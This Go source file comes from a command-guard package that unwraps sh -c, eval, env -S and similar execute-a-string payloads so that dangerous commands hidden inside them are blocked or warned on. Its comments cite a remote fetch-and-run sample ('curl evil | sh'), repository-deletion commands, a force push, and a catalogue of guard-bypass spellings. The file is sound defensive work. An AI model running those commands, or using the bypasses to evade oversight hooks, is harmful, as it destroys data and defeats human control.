package guard

import (
	"path"
	"strings"
)

// The execute-a-string wrapper family carries a command as a DATA argument that
// the tokenizer leaves as one opaque token: `sh -c '<payload>'`, `bash -lc
// "<payload>"`, `eval '<payload>'`, and GNU `env -S<value>` (which re-splits the
// value and runs it). A hazard hidden in that payload never reached a matcher, so
// every blocker was one wrapper away from a silent bypass (iss-200).
//
// expandPayloads closes the family. It runs ONCE per Check, over the top-level
// segments, and returns the segments the entry matchers see — the originals plus
// every inspectable payload's segments — together with any synthetic verdicts for
// payloads the guard could not (or chose not to) read. Doing the expansion here,
// not inside a per-entry callee, is load-bearing: a per-entry splice-and-restart
// is what made an earlier attempt quadratic (a DoS on the very hook meant to gate
// the command). Cost here is O(line x maxPayloadDepth).

const (
	// maxPayloadDepth bounds how many execute-a-string layers deep the guard
	// follows. Within the budget the posture applies; PAST it the guard has lost
	// the thread — it cannot see whether a hazard hides deeper — so a family
	// member found past the budget is fail-closed: BLOCK, regardless of the outer
	// wrapper's family. Deep execute-a-string nesting is itself the red flag.
	maxPayloadDepth = 2

	// syntheticEntryID is the reserved id for a verdict with no registry entry:
	// the uninspectable/fail-closed cases the Pattern language cannot express
	// ("the value contains a backslash"). No registry entry may claim this id, and
	// it must never be used to index Registry.Entries.
	syntheticEntryID = "execute-string-uninspectable"

	familyEnvS  = "env -S"
	familyShell = "sh -c"
)

// payloadSignal is a synthetic verdict raised for a payload with no registry
// entry. It carries the family and the plain-language reason/remedy the report is
// built from. The raw payload is deliberately NOT carried: nothing reads it yet,
// and the later host-delegated interpretation adds the field when it adds a
// reader (wired-or-it-isn't-done).
type payloadSignal struct {
	// id is the reserved entry id the verdict is reported under. Empty means
	// syntheticEntryID — the execute-a-string family's own voice. Tier 2 sets it to
	// speculativeEntryID, because adr-42 decision 2 requires a reader to be able to
	// tell a speculative verdict from a literal one.
	id        string
	verdict   Verdict
	family    string
	reason    string
	successor string
}

// entryID is the id this signal is reported under.
func (s payloadSignal) entryID() string {
	if s.id == "" {
		return syntheticEntryID
	}
	return s.id
}

// expandPayloads expands every execute-a-string payload in segs once, appending
// each inspectable payload's segments in a disjoint chain range, and collecting a
// synthetic signal for each uninspectable or fail-closed payload.
func expandPayloads(segs []segment) ([]segment, []payloadSignal) {
	out := append([]segment(nil), segs...)
	var signals []payloadSignal

	// chainMax is the running maximum chain number across everything appended so
	// far. Each payload's fresh tokenize numbers its chains from 0, so a naive
	// append would collide indices and let an `after_cd` pattern false-fire across
	// a payload boundary; offsetting by chainMax+1 gives every payload a disjoint
	// range while preserving its own internal chain structure.
	chainMax := 0
	for _, s := range segs {
		if s.chain > chainMax {
			chainMax = s.chain
		}
	}

	type work struct {
		segs  []segment
		depth int
	}
	queue := []work{{segs: segs, depth: 0}}
	for len(queue) > 0 {
		item := queue[0]
		queue = queue[1:]
		for _, s := range item.segs {
			kind, fam, payload, trailing, ok := classifySegment(s)
			if !ok {
				continue
			}
			// Past the depth budget the guard cannot follow the nesting, so a
			// family member here is fail-closed regardless of family.
			if item.depth+1 > maxPayloadDepth {
				signals = append(signals, depthBlockSignal(fam))
				continue
			}

			var psegs []segment
			switch kind {
			case kindEnvS:
				toks, inspectable := envInspect(payload, trailing)
				if !inspectable {
					signals = append(signals, envSpecialBlockSignal())
					continue
				}
				psegs = []segment{{tokens: toks}}
			case kindShell:
				sig, pseg, inspectable := shellInspect(payload)
				if !inspectable {
					signals = append(signals, sig)
					continue
				}
				psegs = pseg
			case kindShellWarn:
				signals = append(signals, shellUnresolvedSignal())
				continue
			case kindExecString:
				// The payload is shell grammar (see execstring.go on how large a
				// claim that is), so it is inspected exactly as a shell payload is —
				// the same substitution and pipe-into-interpreter fail-safes apply.
				sig, pseg, inspectable := shellInspect(payload)
				if !inspectable {
					signals = append(signals, sig)
					continue
				}
				psegs = pseg
			case kindExecStringWarn:
				signals = append(signals, execStringWarnSignal(fam))
				continue
			}

			// Offset the payload's chains into a fresh disjoint range and append.
			offset := chainMax + 1
			for i := range psegs {
				psegs[i].chain += offset
				if psegs[i].chain > chainMax {
					chainMax = psegs[i].chain
				}
			}
			out = append(out, psegs...)
			queue = append(queue, work{segs: psegs, depth: item.depth + 1})
		}
	}
	return out, signals
}

const (
	kindEnvS = iota + 1
	kindShell
	kindShellWarn
	// kindExecString is a command string carried by a verb that is NOT a shell
	// (`su -c`, `runuser -c`, `script -c`, `flock -c`); kindExecStringWarn is one
	// whose value the guard could not locate.
	kindExecString
	kindExecStringWarn
)

// isShellFamily reports whether cmd is an interpreter whose `-c <string>` runs
// the string as an ordinary shell command line — the same grammar this package's
// tokenizer already parses. Membership decides whether the guard DESCENDS into a
// payload, so a name missing here is a silent allow for every hazard carried
// inside it.
//
// It is one predicate because it was two. The set lived written out at
// classifySegment and at pipesIntoInterpreter, naming only sh/bash/dash(/eval),
// so `zsh -c "gh repo delete owner/repo"` — zsh being the default login shell on
// macOS, one of the two systems this repo's CI runs on — was a confident, silent
// allow for every bundled blocker. Widening one site and not the other is how a
// fix reaches some sites and leaves the rest latent, so there is now nowhere to
// widen but here.
//
// SCOPE: this is the INTERPRETER set, not the wrapper set. A command that merely
// execs another (`nice`, `setsid`, `flock`, `busybox sh`, `su -c`, `script -c`)
// is handled by `wrappers` in match.go, which this does not touch and which has
// its own gaps — see iss-272. Do not read "nowhere left to widen" as covering
// those.
//
// These are true siblings of the original set: each runs its `-c` operand with
// the grammar already parsed, differing only by a name. A different LANGUAGE is
// not a sibling — `python -c` and `perl -e` carry source this tokenizer cannot
// read. Their recorded posture is a loud warn (see 04-surfaces/17-guard.md), but
// that posture is NOT YET IMPLEMENTED: today the payload is one opaque token that
// Tier 2's position-agnostic fail-safe never lands on, so a non-shell interpreter
// carrying a hazard is a SILENT ALLOW. Do not read the comment as describing
// shipped behaviour — it describes the target (iss-315).
//
// `eval` is not a member: it is a builtin, not an interpreter binary, and carries
// its own end-of-options rule, so it keeps its own branch.
func isShellFamily(cmd string) bool {
	// Folded to lower case: on a case-insensitive filesystem `BASH -c` /
	// `RBASH -c` resolve to and run the real interpreter, so a case-varied name
	// must descend into its payload exactly as the lowercase spelling does
	// (gh-315). rbash (restricted bash, a bash symlink on Debian/Ubuntu) and yash
	// (Yet Another Shell) are real POSIX shells whose `-c` runs the same grammar —
	// the unswept siblings of the closed zsh/ksh fix (gh-353).
	return containsString(shellFamily, strings.ToLower(cmd))
}

// shellFamily is the interpreter set isShellFamily tests; one list so the glob
// compare below and the literal one cannot drift apart. `eval` is not a member
// (see isShellFamily) and is tested separately where it matters.
var shellFamily = []string{"sh", "bash", "dash", "zsh", "ksh", "mksh", "ash", "rbash", "yash"}

// shellFamilyGlob resolves a globbed command name to the interpreter (or the
// eval builtin) it can expand to, fail-closed: the first name the pattern
// matches wins, which is enough because every member's payload is read the
// same way. Behind zsh's noglob the caller never asks.
func shellFamilyGlob(pattern string) (string, bool) {
	pattern = strings.ToLower(pattern)
	for _, name := range append(append([]string(nil), shellFamily...), "eval") {
		if globMatches(pattern, name) {
			return name, true
		}
	}
	return "", false
}

// shellNameGuessed reports whether the execute-a-string reading of this segment
// rests on expanding a GLOBBED command name — `* -c <words>`, `s? -c <words>`.
// Such a reading is a guess about which program runs: the pattern can expand to
// `sh`, and it can equally expand to a program nothing here names. Reading the
// payload on that guess is worth doing, but only IN ADDITION to Tier 2: the
// unrecognised-launcher warn is what adr-42 decision 2 keeps loud when the guard
// cannot say what runs the rest of the line, and letting the guess satisfy
// speculate's carriesPayload gate dropped it — `* -c gh api -X DELETE
// repos/owner/repo` went from a warn to a silent allow, because `sh -c` reads
// only `gh` as the payload and the operands after it become the payload's own
// positional parameters.
func shellNameGuessed(s segment) bool {
	ci, noglob := commandIndex(s)
	if ci < 0 || noglob || !s.globAt(ci) {
		return false
	}
	cmd, _ := commandOf(s)
	if isShellFamily(cmd) || cmd == "eval" {
		return false // the literal name is already an interpreter: no guess
	}
	_, ok := shellFamilyGlob(cmd)
	return ok
}

// singleStringLaunchers run a command handed to them as a single operand by
// passing it to `sh -c`: `watch '<cmd>'`, GNU `parallel '<cmd>' ::: args`. They
// are not shells (isShellFamily misses them) and not wrappers (their operand is a
// shell STRING, not an argv to exec), so a quoted payload was one opaque token
// that defeated even the Tier-2 fail-safe (gh-354). The value maps each launcher
// to its OWN option-argument flags, stepped over so the walk to the command
// operand is not derailed by an interval or a job count.
//
// Like `wrappers`, this is an UPGRADE, not the safety property: a launcher this
// map does not name still takes the Tier-2 posture. It is intentionally small.
var singleStringLaunchers = map[string][]string{
	"watch": {"-n", "--interval"},
	"parallel": {
		"-j", "--jobs", "-N", "-L", "--max-lines", "-n", "--max-args",
		"-I", "-d", "--delimiter", "-C", "--colsep", "--timeout", "--delay",
	},
}

// launcherPayload returns the command STRING a single-string launcher hands to
// `sh -c`: its first non-option operand, but ONLY when that operand is a single
// token carrying a whole command line — the QUOTED form `watch 'git push
// --force'`. The unquoted, multi-token form spreads the command across argv,
// where Tier 2 already restarts at the real command and warns, so it is left to
// that path; classifying it here would switch the Tier-2 fail-safe off for the
// segment and silently allow it. valueFlags are stepped over so an interval or a
// job count is not read as the command operand.
func launcherPayload(args, valueFlags []string) (string, bool) {
	for i := 0; i < len(args); i++ {
		a := args[i]
		if a == "--" {
			if i+1 < len(args) {
				return packedCommand(args[i+1])
			}
			return "", false
		}
		if strings.HasPrefix(a, "-") && a != "-" {
			if !strings.Contains(a, "=") && containsString(valueFlags, a) {
				i++ // its value belongs to the launcher, not to command position
			}
			continue
		}
		return packedCommand(a)
	}
	return "", false
}

// packedCommand accepts an operand as a shell payload only when it carries
// whitespace — the mark of a quoted command line packed into one token. Every
// registry hazard needs at least two tokens, so a whitespace-free operand can
// carry none of them, and reading it as a payload would only shadow the Tier-2
// warn the unquoted form already earns.
func packedCommand(op string) (string, bool) {
	if strings.ContainsAny(op, " \t\n\r") {
		return op, true
	}
	return "", false
}

// classifySegment reports whether a raw segment is an execute-a-string family
// member and, if so, what to do with its payload. env -S is checked FIRST, on the
// raw token chain: env is a registered wrapper whose value-flag walk would
// otherwise consume and discard the -S value before any recognizer built on
// commandOf output could see it (the fix both rev-2 reviews caught). Only when no
// env in the chain carries a split-string flag does the shell -c family get read
// off commandOf output. trailing is env's operands after the -S value, which env
// appends to the split argv.
func classifySegment(s segment) (kind int, family, payload string, trailing []string, ok bool) {
	if v, rest, found := splitStringValue(s.tokens); found {
		return kindEnvS, familyEnvS, v, rest, true
	}
	// The exec-string family is read from the RAW token chain, before commandOf,
	// for the same reason env -S is: two of these verbs (runuser, flock) are also
	// wrappers, so the wrapper walk would step past the verb and read its payload
	// string as the command.
	if verb, v, resolved, found := execStringPayload(s.tokens); found {
		if !resolved {
			return kindExecStringWarn, verb, "", nil, true
		}
		return kindExecString, verb, v, nil, true
	}
	cmd, args := commandOf(s)
	// A globbed interpreter name (`s? -c '<hazard>'`) is read as the pattern
	// it is, for the same reason matchSegment reads a globbed command name:
	// bash expands it before exec, and a payload behind a name this lookup
	// does not open is one opaque token nothing else reaches — a SILENT
	// allow, unlike a globbed wrapper name, which Tier 2 still warns on.
	// This reading is a GUESS about which program runs, so speculate takes it
	// IN ADDITION to Tier 2, never instead of it (shellNameGuessed).
	if shellNameGuessed(s) {
		if name, ok := shellFamilyGlob(cmd); ok {
			cmd = name
		}
	}
	switch {
	case isShellFamily(cmd) || cmd == "eval":
		switch p, state := shellCPayload(cmd, args); state {
		case shellFound:
			return kindShell, familyShell, p, nil, true
		case shellUnresolved:
			// A `-c` string is present but its operand could not be located;
			// fail safe to a loud WARN, never a silent allow.
			return kindShellWarn, familyShell, "", nil, true
		}
	}
	// watch/parallel hand a single quoted operand to `sh -c`, so the packed
	// command string is inspected exactly as a shell payload is (gh-354). The
	// lookup is folded for the same reason isShellFamily is: `WATCH` runs on a
	// case-insensitive filesystem (gh-315).
	if flags, ok := singleStringLaunchers[strings.ToLower(cmd)]; ok {
		if p, ok := launcherPayload(args, flags); ok {
			return kindShell, familyShell, p, nil, true
		}
	}
	return 0, "", "", nil, false
}

// splitStringValue walks the leading wrapper/assignment chain of a raw segment
// and, at EVERY token whose basename is `env` (not just the first), scans that
// env's following tokens for a split-string flag. It returns the RAW value and
// env's trailing operands. An env carrying no split-string flag is stepped over
// as an ordinary wrapper and the scan re-enters at the next command-position
// token, so `env -i env -S <v>` reaches the inner env — a pre-pass that scanned
// only the first env would let commandOf consume the inner value and silent-allow
// the deletion.
func splitStringValue(tokens []string) (string, []string, bool) {
	i := 0
	for i < len(tokens) {
		tok := tokens[i]
		if isAssignment(tok) || reserved[tok] {
			i++
			continue
		}
		// Folded to lower case before lookup: `ENV -S` / `SUDO env -S` resolve to
		// the real binaries on a case-insensitive filesystem, so a case-varied
		// wrapper or env must be walked exactly as its lowercase spelling is, or
		// the split-string value it carries is never read (gh-315).
		w := strings.ToLower(path.Base(tok))
		if w == "env" {
			if v, end, found := scanEnvSplit(tokens, i+1); found {
				return v, tokens[end:], true
			}
			i = skipWrapperArgs(tokens, i+1, "env")
			continue
		}
		if wrappers[w] {
			i = skipWrapperArgs(tokens, i+1, w)
			continue
		}
		break
	}
	return "", nil, false
}

// scanEnvSplit scans one env's option tokens (tokens[start:]) for a split-string
// flag in any of its spellings: separate `-S <v>`, glued `-S<v>`, the
// `--split-string=<v>` and `--s`...`--split-string` prefix range, and a short
// cluster carrying S (`-iS<v>`, `-iS <v>`). It returns the RAW value and the
// index of the FIRST token after the value — env's trailing operands begin there
// — or found=false when this env carries no split-string flag. The scan stops at
// command position so it never reads the launched command's own arguments.
func scanEnvSplit(tokens []string, start int) (value string, valueEnd int, found bool) {
	for i := start; i < len(tokens); i++ {
		tok := tokens[i]
		if tok == "--" || tok == "-" || !strings.HasPrefix(tok, "-") {
			return "", i, false // command/operand position: no split flag here
		}
		if strings.HasPrefix(tok, "--") {
			name, val, hasEq := splitLongOpt(tok)
			if isSplitStringLong(name) {
				if hasEq {
					return val, i + 1, true
				}
				if i+1 < len(tokens) {
					return tokens[i+1], i + 2, true
				}
				return "", i + 1, true
			}
			if !hasEq && longEnvTakesValue(name) {
				i++ // its value is the next token, not command position
			}
			continue
		}
		val, gluedVal, isSplit, takesNext := shortClusterSplit(tok)
		if isSplit {
			if gluedVal {
				return val, i + 1, true
			}
			if i+1 < len(tokens) {
				return tokens[i+1], i + 2, true
			}
			return "", i + 1, true
		}
		if takesNext {
			i++ // a value-taking short flag other than S ended the cluster
		}
	}
	return "", len(tokens), false
}

// splitLongOpt splits `--name=value` into its parts; without an `=` the whole
// token is the name.
func splitLongOpt(tok string) (name, val string, hasEq bool) {
	if eq := strings.IndexByte(tok, '='); eq >= 0 {
		return tok[:eq], tok[eq+1:], true
	}
	return tok, "", false
}

// isSplitStringLong reports whether a long-option name is an unambiguous
// abbreviation of --split-string. getopt_long accepts any non-ambiguous prefix,
// and --split-string is env's only long option beginning with "s", so every
// prefix from --s down to the full spelling means split-string.
func isSplitStringLong(name string) bool {
	return len(name) >= 3 && strings.HasPrefix("--split-string", name)
}

// longEnvTakesValue reports whether one of env's long options consumes the
// FOLLOWING token as its value (`env --chdir /x -S <v>`), so the scan steps over
// the value rather than reading it as command position and missing a later -S.
func longEnvTakesValue(name string) bool {
	switch name {
	case "--unset", "--chdir", "--argv0":
		return true
	}
	return false
}

// shortClusterSplit inspects a short-option cluster (`-i`, `-iS`, `-iSval`, `-u`)
// for env's split-string flag S. isSplit reports S is present; gluedVal reports
// its value was attached in the same token, in which case val holds it; when S is
// present but not glued the value is the next token. takesNext reports that,
// absent S, the cluster ended on a different value-taking short flag whose value
// is the next token, so the caller steps over it.
func shortClusterSplit(tok string) (val string, gluedVal, isSplit, takesNext bool) {
	for j := 1; j < len(tok); j++ {
		c := tok[j]
		if c == 'S' {
			rest := tok[j+1:]
			return rest, rest != "", true, false
		}
		// env's other value-taking short flags: -u NAME, -C DIR, -a ARG. A glued
		// value consumes the rest of the cluster; otherwise the next token is the
		// value. Either way the cluster ends and there is no S beyond it.
		if c == 'u' || c == 'C' || c == 'a' {
			if j+1 < len(tok) {
				return "", false, false, false
			}
			return "", false, false, true
		}
		// A boolean short flag (-i, -0, -v, -P): keep scanning the cluster.
	}
	return "", false, false, false
}

// envInspect decodes an env -S value against env's fixed escape table and, when
// the decoded value passes the plain-command whitelist, splits it on whitespace
// and appends env's trailing operands. The second return is false — meaning env
// uninspectable, which the caller turns into a fail-closed BLOCK — whenever the
// value is not provably plain. Over-blocking is the fail-safe direction; a
// guess-and-allow (an earlier attempt) or a guess-and-warn is not.
func envInspect(value string, trailing []string) ([]string, bool) {
	decoded, ok := decodeEnvS(value)
	if !ok || !isPlainCommand(decoded) {
		return nil, false
	}
	return append(strings.Fields(decoded), trailing...), true
}

// decodeEnvS decodes GNU env's finite -S escape table. ok is false on any escape
// outside the table (a residual backslash env itself would reject), so an
// unknown escape fails closed rather than being left literal.
func decodeEnvS(raw string) (string, bool) {
	if !strings.ContainsRune(raw, '\\') {
		return raw, true
	}
	var b strings.Builder
	for i := 0; i < len(raw); i++ {
		c := raw[i]
		if c != '\\' {
			b.WriteByte(c)
			continue
		}
		if i+1 >= len(raw) {
			return "", false // trailing backslash
		}
		i++
		switch raw[i] {
		case '_':
			b.WriteByte(' ')
		case 't':
			b.WriteByte('\t')
		case 'n':
			b.WriteByte('\n')
		case 'r':
			b.WriteByte('\r')
		case 'f':
			b.WriteByte('\f')
		case 'v':
			b.WriteByte('\v')
		case '#':
			b.WriteByte('#')
		case '\\':
			b.WriteByte('\\')
		case '$':
			b.WriteByte('$')
		default:
			return "", false // an escape env would reject; fail closed
		}
	}
	return b.String(), true
}

// isPlainCommand is the env-special WHITELIST gate: split-and-match runs ONLY
// when the escape-decoded value is provably a plain command line. Anything else —
// a residual backslash, a `$` expansion (whether decoded from `\$` or a bare
// `$VAR`), a quote env would remove, a leading `-` env would re-parse as an
// option, or a `#` comment — fails the gate and the caller blocks. This is a
// whitelist, not a denylist: a novel env-special form cannot slip through by not
// being on a list of known-special constructs.
func isPlainCommand(s string) bool {
	trimmed := strings.TrimLeft(s, " \t\n\r\f\v")
	if trimmed == "" || trimmed[0] == '-' {
		return false
	}
	for i := 0; i < len(s); i++ {
		switch s[i] {
		case '\\', '$', '\'', '"', '#':
			return false
		}
	}
	return true
}

// The three outcomes of resolving an sh/bash/dash `-c` (or eval) invocation's
// command string. shellUnresolved is the fail-safe: a `-c` string is present but
// its operand cannot be confidently located, so the caller raises a loud WARN
// rather than falling through to a silent allow.
const (
	shellNone       = iota // nothing to inspect: a bare interpreter, or `-c` alone
	shellFound             // the command string was located
	shellUnresolved        // a -c string exists but its operand could not be located
)

// shellCPayload extracts the command string an sh/bash/dash `-c` (or `-lc`,
// `-ic`, ...) runs, or the arguments eval joins and runs.
//
// For sh/bash/dash the command string is the shell's FIRST NON-OPTION operand
// per POSIX getopt — not the token that merely follows `-c`. An option split into
// its own token after `-c` (`sh -c -x '<payload>'`, `bash -c -- '<payload>'`)
// otherwise hid the payload behind `-x`/`--` and every blocker inside it was one
// spelling away from a silent allow (iss-200). Boolean option clusters are
// stepped over and a bare `--` ends options; an option that appears to take a
// following argument, or no operand at all, yields shellUnresolved so the caller
// warns instead of guessing.
//
// For eval a single leading `--` (end-of-options) is dropped before the operands
// are joined; `eval -- '<payload>'` tokenized to command `--` and allowed.
func shellCPayload(cmd string, args []string) (string, int) {
	if cmd == "eval" {
		if len(args) > 0 && args[0] == "--" {
			args = args[1:]
		}
		if len(args) == 0 {
			return "", shellNone
		}
		return strings.Join(args, " "), shellFound
	}
	for i := 0; i < len(args); i++ {
		a := args[i]
		if isShortCluster(a) && strings.ContainsRune(a[1:], 'c') {
			return shellOperand(args[i+1:])
		}
	}
	return "", shellNone
}

// shellOperand walks a shell's tokens after the `-c` cluster and returns its
// first non-option operand — the command string. Boolean option clusters (`-x`,
// `-e`) are stepped over and a bare `--` ends options so the next token is the
// operand. An option that appears to consume a following argument (`-o pipefail`,
// `-O extglob`), an unrecognised option, or the absence of any operand means the
// command string cannot be confidently located: shellUnresolved routes to a loud
// WARN, never a guess-and-allow.
func shellOperand(rest []string) (string, int) {
	if len(rest) == 0 {
		return "", shellNone // `sh -c` with nothing after it: nothing to inspect
	}
	for i := 0; i < len(rest); i++ {
		tok := rest[i]
		if tok == "--" {
			if i+1 < len(rest) {
				return rest[i+1], shellFound // end of options: next token is the operand
			}
			return "", shellUnresolved // `-c --` with no operand
		}
		if len(tok) >= 2 && (tok[0] == '-' || tok[0] == '+') {
			if shellClusterBoolean(tok[1:]) {
				continue // a boolean option cluster is not the command string
			}
			return "", shellUnresolved // arg-taking or unknown option: operand unlocatable
		}
		return tok, shellFound // first non-option operand: the command string
	}
	return "", shellUnresolved // options only, no operand found
}

// shellBooleanFlags are the single-letter shell set-options that consume NO
// following argument. The only single-letter shell options that DO take an
// argument are `-o`/`-O` (`set -o NAME`, `bash -O SHOPT`); a cluster carrying
// either — or any character outside this set — is treated as unlocatable and
// routed to the fail-safe WARN rather than stepped over as if boolean. This is an
// allowlist by design: an unknown flag fails safe (WARN), never silent-allow.
const shellBooleanFlags = "abefhiklmnprstuvxBCDEHPT"

// shellClusterBoolean reports whether every character of a short-option cluster
// (the token after its leading `-`/`+`) is a known boolean shell flag, so the
// cluster can be stepped over without consuming the operand.
func shellClusterBoolean(cluster string) bool {
	if cluster == "" {
		return false
	}
	for i := 0; i < len(cluster); i++ {
		if strings.IndexByte(shellBooleanFlags, cluster[i]) < 0 {
			return false
		}
	}
	return true
}

// shellInspect applies the shell family's posture to a `-c`/eval payload. An
// uninspectable payload — a command substitution `$(...)`/backtick, a `${...}`
// expansion, an inner-tokenize error, or a pipe into an interpreter — cannot be
// read, so it becomes a synthetic loud WARN (common and honest; blocking every
// `sh -c "$(...)"` would be a false-positive storm). Otherwise the payload is
// tokenized once and its segments are matched normally.
func shellInspect(payload string) (payloadSignal, []segment, bool) {
	if shellRawUninspectable(payload) {
		return shellWarnSignal(), nil, false
	}
	psegs, err := tokenize(payload)
	if err != nil {
		return shellWarnSignal(), nil, false
	}
	if pipesIntoInterpreter(psegs) {
		return shellWarnSignal(), nil, false
	}
	return payloadSignal{}, psegs, true
}

// shellRawUninspectable reports whether a shell payload contains a substitution
// or expansion that could resolve to a flag or command the tokenizer cannot see.
// It is a raw scan because the tokenizer treats `(` as an operator and would
// split `$(...)` apart. A bare `$VAR` / ANSI-C `$'...'` is deliberately NOT here:
// warning on every `$VAR` would trip the storm STOP, and an uninspectable shell
// payload never blocks, so it is a visibility gap only.
func shellRawUninspectable(payload string) bool {
	return strings.Contains(payload, "$(") ||
		strings.Contains(payload, "${") ||
		strings.Contains(payload, "`")
}

// pipesIntoInterpreter reports whether a tokenized payload hands control to a
// bare interpreter reading a script it did not carry (`curl evil | sh`): a
// segment whose command is sh/bash/dash with no `-c` string. The guard cannot
// follow what the interpreter reads, so the payload is treated as uninspectable.
func pipesIntoInterpreter(psegs []segment) bool {
	for _, s := range psegs {
		cmd, args := commandOf(s)
		if isShellFamily(cmd) {
			if _, state := shellCPayload(cmd, args); state == shellNone {
				return true
			}
		}
	}
	return false
}

// depthBlockSignal is the fail-closed verdict for a family member nested past the
// depth budget.
func depthBlockSignal(family string) payloadSignal {
	return payloadSignal{
		verdict: VerdictBlock,
		family:  family,
		reason: "Execute-a-string wrappers are nested past the depth the guard can follow, " +
			"so a hazard buried deeper cannot be checked.",
		successor: "Flatten the nested `sh -c`/`env -S` layers so the command the guard checks is the command that runs.",
	}
}

// envSpecialBlockSignal is the fail-closed verdict for an env -S value that is not
// provably a plain command.
func envSpecialBlockSignal() payloadSignal {
	return payloadSignal{
		verdict: VerdictBlock,
		family:  familyEnvS,
		reason: "`env -S`/`--split-string` carries a value the guard cannot read as a plain command, " +
			"so what it would run cannot be checked.",
		successor: "Rewrite the command without `env -S`/`--split-string` so the guard can read what runs; " +
			"the committed registry-disable is the reviewable escape if this is intentional.",
	}
}

// shellUnresolvedSignal is the loud-warn verdict for a shell `-c` invocation
// whose command-string operand could not be located behind its options — the
// fail-safe that keeps an option-obscured payload visible instead of silently
// allowed.
func shellUnresolvedSignal() payloadSignal {
	return payloadSignal{
		verdict: VerdictWarn,
		family:  familyShell,
		reason: "This `sh -c`/`bash -c` invocation places options after `-c` that obscure which operand is the command string, " +
			"so the guard cannot read the command it will actually run.",
		successor: "Put the command string immediately after `-c`, before any other options, so the guard can check it.",
	}
}

// shellWarnSignal is the loud-warn verdict for an uninspectable shell payload.
func shellWarnSignal() payloadSignal {
	return payloadSignal{
		verdict: VerdictWarn,
		family:  familyShell,
		reason: "This `sh -c`/`bash -c` payload contains a substitution or a pipe into an interpreter, " +
			"so the guard cannot read the command it will actually run.",
		successor: "If this is intentional, run it as written; prefer spelling the command out so the guard can check it.",
	}
}
